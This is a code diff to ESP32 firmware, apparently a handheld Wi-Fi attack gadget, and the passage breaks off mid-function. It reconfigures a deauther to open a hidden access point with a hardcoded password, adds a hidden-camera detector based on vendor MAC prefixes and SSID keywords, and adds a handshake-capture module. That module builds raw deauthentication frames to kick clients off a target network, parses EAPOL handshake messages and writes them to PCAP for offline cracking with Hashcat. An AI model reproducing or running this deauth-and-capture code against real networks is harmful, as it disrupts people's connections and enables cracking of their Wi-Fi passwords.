@@ -4457,15 +4457,34 @@ bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
     return false;
 }
 
+// Deauther's resetWifi - restarts WiFi and re-configures AP mode
 void resetWifi() {
     esp_wifi_stop();
     delay(200);
     esp_wifi_start();
     delay(200);
+
+    // Re-configure AP mode after restart
+    WiFi.mode(WIFI_AP);
+    delay(100);
+
+    wifi_config_t ap_config = {0};
+    strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
+    ap_config.ap.ssid_len = strlen("ESP32-DIV");
+    strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
+    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
+    ap_config.ap.ssid_hidden = 1;
+    ap_config.ap.max_connection = 4;
+    ap_config.ap.beacon_interval = 100;
+    ap_config.ap.channel = selectedChannel;
+    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    delay(50);
+
     packet_count = 0;
     success_count = 0;
     consecutive_failures = 0;
 }
+
 
 void drawAttackScreen() {
     tft.drawFastHLine(0, 19, 240, UI_LINE);
@@ -4532,6 +4551,29 @@ static void deautherHandleNavButtons() {
 
     if (selected_ap_index >= 0) {
         if (isButtonPressedEdge(BTN_LEFT)) {
+            if (!attack_running) {
+                // Starting attack — switch to AP mode on target channel
+                WiFi.mode(WIFI_AP);
+                delay(100);
+                
+                wifi_config_t ap_config = {0};
+                strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
+                ap_config.ap.ssid_len = strlen("ESP32-DIV");
+                strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
+                ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
+                ap_config.ap.ssid_hidden = 1;
+                ap_config.ap.max_connection = 4;
+                ap_config.ap.beacon_interval = 100;
+                ap_config.ap.channel = selectedChannel;
+                esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+                delay(50);
+                
+                // Reset counters
+                packet_count = 0;
+                success_count = 0;
+                consecutive_failures = 0;
+                last_packet_time = 0;
+            }
             attack_running = !attack_running;
             if (!attack_running) {
                 last_packet_time = 0;
@@ -4804,7 +4846,7 @@ void deautherLoop() {
     uint32_t current_time = millis();
     if (attack_running && selected_ap_index != -1) {
         uint32_t heap = ESP.getFreeHeap();
-        if (heap < 80000) {
+        if (heap < 40000) {
             attack_running = false;
             last_packet_time = 0;
             drawAttackScreen();
@@ -10666,4 +10708,1402 @@ void updateLoop() {
     delay(200);
   }
 }
+}  // namespace FirmwareUpdate
+
+// ══════════════════════════════════════════════════════════════════
+// Hidden Camera Detector
+// Scans WiFi for devices matching known camera/IoT OUI prefixes and
+// suspicious SSID patterns. Alerts via on-screen highlight.
+// ══════════════════════════════════════════════════════════════════
+namespace CameraDetector {
+
+#undef TFT_BLACK
+#define TFT_BLACK FEATURE_BG
+#undef TFT_WHITE
+#define TFT_WHITE FEATURE_TEXT
+
+struct CamMatch {
+  char ssid[33];
+  uint8_t bssid[6];
+  int rssi;
+  int channel;
+  uint8_t authmode;
+  bool isCameraOUI;
+  bool isSuspiciousSSID;
+  bool isHiddenSSID;
+  const char* vendor;
+  const char* ssidMatch;
+};
+
+// Known camera/IoT vendor OUI prefixes (first 3 octets of MAC).
+static const uint8_t kCameraOUIs[][3] = {
+  {0x90, 0x02, 0xA9},  // Hikvision
+  {0xC0, 0x56, 0x27},  // Hikvision
+  {0x28, 0x57, 0x2E},  // Hikvision
+  {0x18, 0x68, 0xCB},  // Dahua
+  {0x3C, 0xEF, 0x8C},  // Dahua
+  {0xA0, 0xBD, 0x1D},  // Dahua
+  {0x10, 0x14, 0x06},  // Dahua
+  {0x9C, 0x14, 0x6A},  // Dahua
+  {0xCC, 0x61, 0xE1},  // Dahua
+  {0xB0, 0xA7, 0xB9},  // Reolink
+  {0xEC, 0x71, 0xDB},  // Reolink
+  {0x08, 0x00, 0x36},  // Reolink
+  {0x00, 0x1A, 0x11},  // Axis Communications
+  {0xAC, 0xCC, 0x8A},  // Axis Communications
+  {0x00, 0x40, 0x8C},  // Axis Communications
+  {0x00, 0x0C, 0x29},  // Foscam
+  {0x90, 0x1B, 0x6E},  // Amcrest
+  {0x18, 0xD6, 0xC7},  // Wyze
+  {0x00, 0x12, 0x14},  // Bosch Security
+  {0xB8, 0x27, 0xEB},  // Raspberry Pi
+  {0xDC, 0xA6, 0x32},  // Raspberry Pi
+  {0xE4, 0x5F, 0x01},  // Raspberry Pi
+};
+
+static const char* kCameraVendors[] = {
+  "Hikvision", "Hikvision", "Hikvision",
+  "Dahua", "Dahua", "Dahua", "Dahua", "Dahua", "Dahua",
+  "Reolink", "Reolink", "Reolink",
+  "Axis", "Axis", "Axis",
+  "Foscam", "Amcrest", "Wyze",
+  "Bosch Security",
+  "Raspberry Pi", "Raspberry Pi", "Raspberry Pi",
+};
+
+static const int kNumCameraOUIs = sizeof(kCameraOUIs) / sizeof(kCameraOUIs[0]);
+
+// Tightened SSID keywords — only specific camera product prefixes, not generic terms.
+struct SsidPattern {
+  const char* pattern;
+  const char* label;
+};
+
+static const SsidPattern kSuspiciousSSIDs[] = {
+  {"IPCAM",      "IP Camera"},
+  {"IP-CAM",     "IP Camera"},
+  {"IPC-",       "IP Camera"},
+  {"IPC_",       "IP Camera"},
+  {"HIKVISION",  "Hikvision"},
+  {"HIK-",       "Hikvision"},
+  {"DS-2",       "Hikvision Cam"},
+  {"DAHUA",      "Dahua"},
+  {"DH-",        "Dahua Cam"},
+  {"REOLINK",    "Reolink"},
+  {"RLK-",       "Reolink"},
+  {"AMCREST",    "Amcrest"},
+  {"IP2M-",      "Amcrest Cam"},
+  {"FOSCAM",     "Foscam"},
+  {"FI-",        "Foscam Cam"},
+  {"WYZECAM",    "Wyze Cam"},
+  {"YIHOME",     "YI Camera"},
+  {"YI-",        "YI Camera"},
+  {"ARLO",       "Arlo Cam"},
+  {"RING-",      "Ring Cam"},
+  {"BOSCH",      "Bosch Security"},
+  {"AXIS-",      "Axis Cam"},
+  {"HiddenCam",  "Hidden Cam"},
+};
+static const int kNumSuspiciousSSIDs = sizeof(kSuspiciousSSIDs) / sizeof(kSuspiciousSSIDs[0]);
+
+static CamMatch s_matches[ESP32DIV_MAX_WIFI_NETWORKS];
+static int s_matchCount = 0;
+static int s_totalScanned = 0;
+static bool s_scanning = false;
+static int s_selIdx = 0;
+static int s_listPage = 0;
+static bool s_inDetailView = false;
+static int s_detailIdx = 0;
+
+// Display layout
+static constexpr int kHeaderY = 22;
+static constexpr int kRowH = 24;
+static constexpr int kLabelH = 14;
+
+static int camContentBottom() {
+  return featureHasTouchNavBar() ? touchNavContentBottomY() : 320;
 }
+
+static int camRowsPerPage() {
+  const int avail = camContentBottom() - kHeaderY - kLabelH - 10;
+  return max(1, avail / kRowH);
+}
+
+static const char* matchOUI(const uint8_t bssid[6], bool& isCameraOUI) {
+  for (int i = 0; i < kNumCameraOUIs; i++) {
+    if (bssid[0] == kCameraOUIs[i][0] &&
+        bssid[1] == kCameraOUIs[i][1] &&
+        bssid[2] == kCameraOUIs[i][2]) {
+      isCameraOUI = true;
+      return kCameraVendors[i];
+    }
+  }
+  isCameraOUI = false;
+  return nullptr;
+}
+
+static const char* matchSSID(const char* ssid, bool& matched) {
+  if (!ssid || ssid[0] == '\0') { matched = false; return nullptr; }
+  String upper = String(ssid);
+  upper.toUpperCase();
+  for (int i = 0; i < kNumSuspiciousSSIDs; i++) {
+    if (upper.indexOf(kSuspiciousSSIDs[i].pattern) >= 0) {
+      matched = true;
+      return kSuspiciousSSIDs[i].label;
+    }
+  }
+  matched = false;
+  return nullptr;
+}
+
+static void performScan() {
+  s_scanning = true;
+  featureClearContent(TFT_BLACK);
+  tft.setTextColor(FEATURE_TEXT, TFT_BLACK);
+  tft.setTextFont(2);
+  tft.setTextSize(1);
+  tft.setCursor(20, 80);
+  tft.print("Scanning WiFi...");
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+  int n = WifiScan::staWifiScanSync();
+  s_totalScanned = n;
+  s_matchCount = 0;
+  s_selIdx = 0;
+  s_listPage = 0;
+
+  if (n <= 0) {
+    s_scanning = false;
+    return;
+  }
+
+  for (int i = 0; i < n && s_matchCount < ESP32DIV_MAX_WIFI_NETWORKS; i++) {
+    String ssidStr = WiFi.SSID(i);
+    uint8_t bssid[6];
+    memcpy(bssid, WiFi.BSSID(i), 6);
+
+    bool isCameraOUI = false;
+    const char* vendor = matchOUI(bssid, isCameraOUI);
+    bool ssidMatched = false;
+    const char* ssidLabel = matchSSID(ssidStr.c_str(), ssidMatched);
+    bool isHidden = (ssidStr.length() == 0);
+
+    // Only flag if: OUI match (camera hardware) OR SSID keyword match
+    // Hidden SSIDs alone are NOT flagged (too many legitimate hidden networks)
+    // But hidden SSID + camera OUI = high confidence
+    if (isCameraOUI || ssidMatched) {
+      CamMatch& m = s_matches[s_matchCount];
+      strncpy(m.ssid, ssidStr.c_str(), 32);
+      m.ssid[32] = '\0';
+      memcpy(m.bssid, bssid, 6);
+      m.rssi = WiFi.RSSI(i);
+      m.channel = WiFi.channel(i);
+      m.authmode = WiFi.encryptionType(i);
+      m.isCameraOUI = isCameraOUI;
+      m.isSuspiciousSSID = ssidMatched;
+      m.isHiddenSSID = isHidden;
+      m.vendor = vendor ? vendor : "Unknown";
+      m.ssidMatch = ssidLabel ? ssidLabel : "None";
+      s_matchCount++;
+    }
+  }
+
+  WiFi.scanDelete();
+  s_scanning = false;
+}
+
+static void drawMac(char* buf, size_t bufSize, const uint8_t mac[6]) {
+  snprintf(buf, bufSize, "%02X:%02X:%02X:%02X:%02X:%02X",
+           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+}
+
+static const char* authModeStr(uint8_t auth) {
+  switch (auth) {
+    case WIFI_AUTH_OPEN: return "OPEN";
+    case WIFI_AUTH_WPA_PSK: return "WPA";
+    case WIFI_AUTH_WPA2_PSK: return "WPA2";
+    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
+    case WIFI_AUTH_WPA3_PSK: return "WPA3";
+    default: return "Unknown";
+  }
+}
+
+static const char* threatLevel(const CamMatch& m) {
+  if (m.isCameraOUI && m.isSuspiciousSSID) return "HIGH";
+  if (m.isCameraOUI) return "MEDIUM";
+  if (m.isSuspiciousSSID) return "LOW";
+  return "INFO";
+}
+
+static uint16_t threatColor(const CamMatch& m) {
+  if (m.isCameraOUI && m.isSuspiciousSSID) return TFT_RED;
+  if (m.isCameraOUI) return TFT_YELLOW;
+  if (m.isSuspiciousSSID) return TFT_CYAN;
+  return UI_TEXT;
+}
+
+static void displayResults() {
+  featureClearContent(TFT_BLACK);
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+  // Header
+  tft.setTextFont(1);
+  tft.setTextSize(1);
+  tft.setTextColor(FEATURE_TEXT, TFT_BLACK);
+  tft.setCursor(5, kHeaderY);
+  if (s_matchCount == 0) {
+    tft.setTextColor(GREEN, TFT_BLACK);
+    tft.print("CLEAR  |  ");
+    tft.setTextColor(UI_TEXT, TFT_BLACK);
+    tft.print(String(s_totalScanned) + " networks");
+  } else {
+    tft.setTextColor(TFT_RED, TFT_BLACK);
+    tft.print(String(s_matchCount) + " match");
+    tft.setTextColor(UI_TEXT, TFT_BLACK);
+    tft.print("  |  " + String(s_totalScanned) + " scanned");
+  }
+
+  // Matches with pagination
+  int y = kHeaderY + kLabelH + 4;
+  const int rowsPerPage = camRowsPerPage();
+  int start = s_listPage * rowsPerPage;
+  int end = min(start + rowsPerPage, s_matchCount);
+
+  for (int i = start; i < end; i++) {
+    const CamMatch& m = s_matches[i];
+    bool isSel = (i == s_selIdx);
+
+    uint16_t rowBorder = threatColor(m);
+    uint16_t rowBg = isSel ? 0x4208 : (m.isCameraOUI ? 0x4000 : 0x4008);
+
+    tft.fillRoundRect(3, y, 234, kRowH - 4, 2, rowBg);
+    tft.drawRoundRect(3, y, 234, kRowH - 4, 2, rowBorder);
+
+    tft.setTextFont(1);
+    tft.setTextSize(1);
+
+    // Threat level tag
+    tft.setTextColor(rowBorder, rowBg);
+    tft.setCursor(6, y + 2);
+    tft.print("[");
+    tft.print(threatLevel(m));
+    tft.print("]");
+
+    // Vendor or SSID match
+    if (m.isCameraOUI) {
+      tft.setTextColor(TFT_WHITE, rowBg);
+      tft.setCursor(45, y + 2);
+      tft.print(m.vendor);
+    } else {
+      tft.setTextColor(TFT_CYAN, rowBg);
+      tft.setCursor(45, y + 2);
+      tft.print(m.ssidMatch);
+    }
+
+    // SSID name
+    String ssidDisplay = String(m.ssid);
+    if (ssidDisplay.length() == 0) ssidDisplay = "[Hidden]";
+    if (ssidDisplay.length() > 24) ssidDisplay = ssidDisplay.substring(0, 24);
+    tft.setTextColor(isSel ? ORANGE : TFT_WHITE, rowBg);
+    tft.setCursor(6, y + 13);
+    tft.print(ssidDisplay);
+
+    // RSSI + channel
+    tft.setTextColor(UI_TEXT, rowBg);
+    tft.setCursor(170, y + 13);
+    tft.print(m.rssi);
+    tft.print("dB");
+
+    y += kRowH;
+  }
+
+  // Footer
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(5, camContentBottom() - 12);
+  if (s_matchCount > 0) {
+    tft.print("SEL=Details  UP/DOWN=Scroll  L=Rescan");
+  } else {
+    tft.print("L=Rescan  SEL=Exit");
+  }
+
+  if (featureHasTouchNavBar()) {
+    setTouchNavLabels("Rescan", "Next", "Exit", "Prev", "Details");
+  }
+}
+
+static void displayDetail() {
+  if (s_detailIdx < 0 || s_detailIdx >= s_matchCount) return;
+  const CamMatch& m = s_matches[s_detailIdx];
+
+  featureClearContent(TFT_BLACK);
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+  tft.setTextFont(1);
+  tft.setTextSize(1);
+
+  // Title
+  tft.setTextColor(threatColor(m), TFT_BLACK);
+  tft.setCursor(5, kHeaderY);
+  tft.print("THREAT: ");
+  tft.print(threatLevel(m));
+
+  int y = kHeaderY + 16;
+
+  // SSID
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(5, y);
+  tft.print("SSID: ");
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+  if (m.isHiddenSSID) {
+    tft.print("[Hidden SSID]");
+  } else {
+    tft.print(m.ssid);
+  }
+  y += 14;
+
+  // MAC
+  char macBuf[20];
+  drawMac(macBuf, sizeof(macBuf), m.bssid);
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(5, y);
+  tft.print("MAC:  ");
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.print(macBuf);
+  y += 14;
+
+  // OUI vendor
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(5, y);
+  tft.print("OUI:  ");
+  if (m.isCameraOUI) {
+    tft.setTextColor(TFT_RED, TFT_BLACK);
+    tft.print(m.vendor);
+    tft.print(" (CONFIRMED)");
+  } else {
+    tft.setTextColor(UI_TEXT, TFT_BLACK);
+    tft.print("No camera OUI match");
+  }
+  y += 14;
+
+  // SSID pattern match
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(5, y);
+  tft.print("SSID: ");
+  if (m.isSuspiciousSSID) {
+    tft.setTextColor(TFT_CYAN, TFT_BLACK);
+    tft.print(m.ssidMatch);
+  } else {
+    tft.setTextColor(UI_TEXT, TFT_BLACK);
+    tft.print("No pattern match");
+  }
+  y += 14;
+
+  // Channel + RSSI
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(5, y);
+  tft.print("Chan: ");
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.print(m.channel);
+  tft.print("  RSSI: ");
+  tft.print(m.rssi);
+  tft.print(" dBm");
+  y += 14;
+
+  // Encryption
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(5, y);
+  tft.print("Auth: ");
+  tft.setTextColor(TFT_WHITE, TFT_BLACK);
+  tft.print(authModeStr(m.authmode));
+  y += 20;
+
+  // Signal quality assessment
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(5, y);
+  tft.print("Signal: ");
+  if (m.rssi > -50) {
+    tft.setTextColor(TFT_RED, TFT_BLACK);
+    tft.print("Very close");
+  } else if (m.rssi > -65) {
+    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+    tft.print("Nearby");
+  } else if (m.rssi > -75) {
+    tft.setTextColor(TFT_CYAN, TFT_BLACK);
+    tft.print("Moderate");
+  } else {
+    tft.setTextColor(UI_TEXT, TFT_BLACK);
+    tft.print("Far");
+  }
+  y += 20;
+
+  // Assessment
+  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
+  tft.setCursor(5, y);
+  if (m.isCameraOUI && m.isSuspiciousSSID) {
+    tft.print("Camera OUI + SSID match.");
+    tft.setCursor(5, y + 12);
+    tft.print("Very likely a camera.");
+  } else if (m.isCameraOUI) {
+    tft.print("Camera vendor MAC detected.");
+    tft.setCursor(5, y + 12);
+    tft.print("Likely camera hardware.");
+  } else if (m.isSuspiciousSSID) {
+    tft.print("SSID matches camera pattern.");
+    tft.setCursor(5, y + 12);
+    tft.print("Investigate further.");
+  }
+  y += 28;
+
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(5, y);
+  tft.print("L=Back  SEL=Exit");
+
+  if (featureHasTouchNavBar()) {
+    setTouchNavLabels("Back", "", "Exit", "", "");
+  }
+}
+
+static void displayScanning() {
+  featureClearContent(TFT_BLACK);
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  tft.setTextFont(2);
+  tft.setTextSize(1);
+  tft.setTextColor(FEATURE_TEXT, TFT_BLACK);
+  tft.setCursor(30, 80);
+  tft.print("Scanning for");
+  tft.setCursor(30, 100);
+  tft.print("hidden cameras...");
+  tft.setTextFont(1);
+  tft.setTextColor(UI_TEXT, TFT_BLACK);
+  tft.setCursor(30, 130);
+  tft.print("Checking OUI + SSID patterns");
+}
+
+void camDetectorSetup() {
+  pauseBackgroundRadioTasks();
+  setTouchButtonInputEnabled(true);
+  featureClearContent(TFT_BLACK);
+
+  float battV = readBatteryVoltage();
+  drawStatusBar(battV, true);
+  redrawTouchButtonBar();
+
+#if HAS_PCF8574_BUTTONS
+  pcf.pinMode(BTN_UP, INPUT_PULLUP);
+  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
+  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
+  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
+#endif
+
+  setupTouchscreen();
+  s_matchCount = 0;
+  s_totalScanned = 0;
+  s_selIdx = 0;
+  s_listPage = 0;
+  s_inDetailView = false;
+
+  if (featureHasTouchNavBar()) {
+    setTouchNavLabels("Rescan", "Next", "Exit", "Prev", "Details");
+  }
+
+  performScan();
+  displayResults();
+  redrawTouchButtonBar();
+}
+
+void camDetectorLoop() {
+  if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
+    feature_exit_requested = true;
+    return;
+  }
+
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  updateStatusBar();
+
+  if (s_inDetailView) {
+    // Detail view — Left/Back to return
+    if (isButtonPressedEdge(BTN_LEFT) ||
+        (featureHasTouchNavBar() && isTouchNavButtonPressedEdge(BTN_LEFT))) {
+      s_inDetailView = false;
+      displayResults();
+      redrawTouchButtonBar();
+    }
+    // Up/Down to cycle through matches in detail view
+    if (isButtonPressedEdge(BTN_UP) || 
+        (featureHasTouchNavBar() && isTouchNavButtonPressedEdge(BTN_UP))) {
+      if (s_detailIdx > 0) {
+        s_detailIdx--;
+        displayDetail();
+        redrawTouchButtonBar();
+      }
+    }
+    if (isButtonPressedEdge(BTN_DOWN) ||
+        (featureHasTouchNavBar() && isTouchNavButtonPressedEdge(BTN_DOWN))) {
+      if (s_detailIdx < s_matchCount - 1) {
+        s_detailIdx++;
+        displayDetail();
+        redrawTouchButtonBar();
+      }
+    }
+    delay(50);
+    return;
+  }
+
+  // List view
+  const int rowsPerPage = camRowsPerPage();
+
+  // Rescan on Left/Scan button only (NO auto-rescan)
+  if (isButtonPressedEdge(BTN_LEFT) ||
+      (featureHasTouchNavBar() && isTouchNavButtonPressedEdge(BTN_LEFT))) {
+    performScan();
+    displayResults();
+    redrawTouchButtonBar();
+  }
+
+  // Navigate up
+  if (isButtonPressedEdge(BTN_UP) ||
+      (featureHasTouchNavBar() && isTouchNavButtonPressedEdge(BTN_UP))) {
+    if (s_selIdx > 0) {
+      s_selIdx--;
+      if (s_selIdx < s_listPage * rowsPerPage) s_listPage--;
+      displayResults();
+      redrawTouchButtonBar();
+    }
+  }
+
+  // Navigate down
+  if (isButtonPressedEdge(BTN_DOWN) ||
+      (featureHasTouchNavBar() && isTouchNavButtonPressedEdge(BTN_DOWN))) {
+    if (s_selIdx < s_matchCount - 1) {
+      s_selIdx++;
+      if (s_selIdx >= (s_listPage + 1) * rowsPerPage) s_listPage++;
+      displayResults();
+      redrawTouchButtonBar();
+    }
+  }
+
+  // Open detail view
+  if (isButtonPressedEdge(BTN_RIGHT) ||
+      (featureHasTouchNavBar() && isTouchNavButtonPressedEdge(BTN_RIGHT))) {
+    if (s_matchCount > 0) {
+      s_detailIdx = s_selIdx;
+      s_inDetailView = true;
+      displayDetail();
+      redrawTouchButtonBar();
+    }
+  }
+
+  delay(50);
+}
+
+}  // namespace CameraDetector
+
+// ══════════════════════════════════════════════════════════════════
+// WiFi Handshake Capture
+// Select target AP → deauth clients → capture EAPOL handshake → PCAP to SD
+// Ready for offline cracking with Hashcat (-m 22000) or John the Ripper.
+// ══════════════════════════════════════════════════════════════════
+namespace HandshakeCapture {
+
+#undef TFT_BLACK
+#define TFT_BLACK FEATURE_BG
+#undef TFT_WHITE
+#define TFT_WHITE FEATURE_TEXT
+
+// --- PCAP structures (self-contained, not sharing PacketMonitor's) ---
+static constexpr uint32_t PCAP_MAGIC  = 0xa1b2c3d4;
+static constexpr uint16_t PCAP_VMAJ   = 2;
+static constexpr uint16_t PCAP_VMIN   = 4;
+static constexpr uint32_t PCAP_DLT    = 127;  // DLT_IEEE802_11_RADIO
+static constexpr uint16_t RADIOTAP_LEN = 9;   // minimal radiotap header
+
+struct __attribute__((packed)) PcapGlobalHdr {
+  uint32_t magic;
+  uint16_t vmaj, vmin;
+  int32_t  tz;
+  uint32_t sigfigs, snaplen, network;
+};
+
+struct __attribute__((packed)) PcapRecHdr {
+  uint32_t ts_sec, ts_usec, incl_len, orig_len;
+};
+
+struct __attribute__((packed)) RadiotapHdr {
+  uint8_t  version, pad;
+  uint16_t len;
+  uint32_t present;
+} __attribute__((packed));
+
+// --- State ---
+enum class HsState { Scanning, ListReady, Targeting, Capturing, Done };
+
+static HsState s_state = HsState::Scanning;
+static wifi_ap_record_t* s_apList = nullptr;
+static int s_apCount = 0;
+static int s_selIdx = 0;
+static int s_listPage = 0;
+
+static wifi_ap_record_t s_targetAp;
+static uint8_t s_targetChannel = 1;
+
+static File s_pcapFile;
+static String s_pcapPath;
+static volatile uint32_t s_eapolCount = 0;
+static volatile uint32_t s_totalPackets = 0;
+static volatile bool s_gotHandshake = false;
+
+// EAPOL frame types we track
+static volatile bool s_gotM1 = false;  // EAPOL-Key msg 1/4
+static volatile bool s_gotM2 = false;  // EAPOL-Key msg 2/4
+static volatile bool s_gotM3 = false;  // EAPOL-Key msg 3/4
+static volatile bool s_gotM4 = false;  // EAPOL-Key msg 4/4
+
+static uint32_t s_deauthCount = 0;
+static unsigned long s_lastDeauthMs = 0;
+static const uint32_t kDeauthInterval = 200;  // ms between deauth bursts
+static unsigned long s_captureStartMs = 0;
+static const uint32_t kCaptureTimeout = 60000;  // 60s max capture
+
+// Deauth frame template
+static uint8_t s_deauthFrame[26] = {
+  0xC0, 0x00, 0x00, 0x00,
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // dest (broadcast)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // src (AP BSSID, filled at runtime)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (filled at runtime)
+  0x00, 0x00,  // duration
+  0x07, 0x00   // reason: Class 3 frame from non-associated STA
+};
+
+// --- Display layout ---
+static constexpr int kHeaderY = 22;
+static constexpr int kRowH = 22;
+static constexpr int kFirstRowY = kHeaderY + 14;
+
+static int hsContentBottom() {
+  return featureHasTouchNavBar() ? touchNavContentBottomY() : 320;
+}
+
+static int hsRowsPerPage() {
+  return max(1, (hsContentBottom() - kFirstRowY) / kRowH);
+}
+
+// --- EAPOL detection ---
+// 802.11 Data frame: frame_control byte0 bits [7:6] = 0b10 (Type=Data)
+// LLC/SNAP header: AA AA 03 00 00 00
+// EAPOL ethertype: 88 8E
+static bool isEAPOL(const uint8_t* payload, uint16_t len) {
+  if (!payload || len < 30) return false;
+
+  // Frame control: check if it's a Data frame (type=2)
+  uint8_t fc0 = payload[0];
+  uint8_t ftype = (fc0 >> 2) & 0x03;
+  if (ftype != 2) return false;  // Not a data frame
+
+  // Find LLC/SNAP header. In 802.11 data frames, the payload starts after
+  // the frame header (24 bytes) + possible QoS header (2 bytes) + possible HT control (4 bytes).
+  uint16_t offset = 24;
+
+  // Check for QoS data subtype
+  uint8_t subtype = (fc0 >> 4) & 0x0F;
+  if (subtype & 0x08) {
+    offset += 2;  // QoS field
+  }
+
+  if (offset + 8 > len) return false;
+
+  // LLC/SNAP: AA AA 03 00 00 00 88 8E
+  const uint8_t* llc = payload + offset;
+  if (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
+      llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 &&
+      llc[6] == 0x88 && llc[7] == 0x8E) {
+    return true;
+  }
+
+  return false;
+}
+
+// Determine which EAPOL-Key message (1-4) based on Key Info field
+static int eapolKeyMsgNum(const uint8_t* payload, uint16_t len) {
+  uint8_t fc0 = payload[0];
+  uint8_t subtype = (fc0 >> 4) & 0x0F;
+  uint16_t offset = 24;
+  if (subtype & 0x08) offset += 2;
+  if (offset + 8 > len) return 0;
+
+  // EAPOL-Key starts after LLC/SNAP (8 bytes) + EAPOL header (4 bytes) = offset+12
+  if (offset + 12 + 7 > len) return 0;
+
+  // EAPOL-Key descriptor type = offset + 12 + 1
+  const uint8_t* eapolKey = payload + offset + 8;  // after LLC/SNAP
+  // EAPOL header: version(1) type(1) length(2)
+  // EAPOL-Key: descriptor_type(1) key_info(2) ...
+  if (eapolKey[1] != 0x03) return 0;  // Not EAPOL-Key type (0x03)
+
+  const uint8_t* keyInfo = eapolKey + 4;  // descriptor_type(1) + key_info(2)
+  uint16_t info = (keyInfo[0] << 8) | keyInfo[1];
+
+  // Key Info bits: install(1) keyAck(2) keyMIC(3) secure(4) error(5) request(6) encrypted(7)
+  bool ack = info & 0x80;
+  bool mic = info & 0x100;
+  bool secure = info & 0x200;
+
+  // M1: ack=1, mic=0, secure=0
+  // M2: ack=0, mic=1, secure=0
+  // M3: ack=1, mic=1, secure=0 (usually)
+  // M4: ack=0, mic=1, secure=1 (usually)
+  if (ack && !mic) return 1;
+  if (!ack && mic && !secure) return 2;
+  if (ack && mic) return 3;
+  if (!ack && mic && secure) return 4;
+  return 0;
+}
+
+// --- PCAP writing ---
+static bool hsPcapOpen() {
+  if (!isSDCardAvailable()) return false;
+  if (!SD.exists(CAPTURE_DIR)) {
+    SD.mkdir(CAPTURE_DIR);
+  }
+
+  for (uint16_t i = 0; i < 10000; i++) {
+    char buf[64];
+    snprintf(buf, sizeof(buf), "%s/hs_%04u.pcap", CAPTURE_DIR, (unsigned)i);
+    if (!SD.exists(buf)) {
+      s_pcapPath = String(buf);
+      break;
+    }
+  }
+  if (s_pcapPath.length() == 0) return false;
+
+  s_pcapFile = SD.open(s_pcapPath.c_str(), FILE_WRITE);
+  if (!s_pcapFile) return false;
+
+  PcapGlobalHdr gh{};
+  gh.magic = PCAP_MAGIC;
+  gh.vmaj = PCAP_VMAJ;
+  gh.vmin = PCAP_VMIN;
+  gh.tz = 0;
+  gh.sigfigs = 0;
+  gh.snaplen = 65535;
+  gh.network = PCAP_DLT;
+  s_pcapFile.write((const uint8_t*)&gh, sizeof(gh));
+  return true;
+}
+
+static void hsPcapWritePacket(const uint8_t* data, uint16_t len, int8_t rssi, uint8_t channel) {
+  if (!s_pcapFile) return;
+
+  // Build minimal radiotap header
+  uint8_t rt[RADIOTAP_LEN];
+  rt[0] = 0;          // version
+  rt[1] = 0;          // pad
+  rt[2] = RADIOTAP_LEN & 0xFF;
+  rt[3] = (RADIOTAP_LEN >> 8) & 0xFF;
+  // present flags: only signal + channel
+  rt[4] = 0x00;
+  rt[5] = 0x00;
+  rt[6] = 0x00;
+  rt[7] = 0x00;
+  rt[8] = (uint8_t)rssi;
+
+  uint16_t totalLen = RADIOTAP_LEN + len;
+
+  const int64_t nowUs = esp_timer_get_time();
+  PcapRecHdr rh{};
+  rh.ts_sec = (uint32_t)(nowUs / 1000000LL);
+  rh.ts_usec = (uint32_t)(nowUs % 1000000LL);
+  rh.incl_len = totalLen;
+  rh.orig_len = totalLen;
+
+  s_pcapFile.write((const uint8_t*)&rh, sizeof(rh));
+  s_pcapFile.write(rt, RADIOTAP_LEN);
+  s_pcapFile.write(data, len);
+  s_pcapFile.flush();
+}
+
+static void hsPcapClose() {
+  if (s_pcapFile) {
+    s_pcapFile.flush();
+    s_pcapFile.close();
+  }
+}
+
+// --- Promiscuous callback ---
+static void hsPromiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (type == WIFI_PKT_MISC) return;
+  if (!buf) return;
+
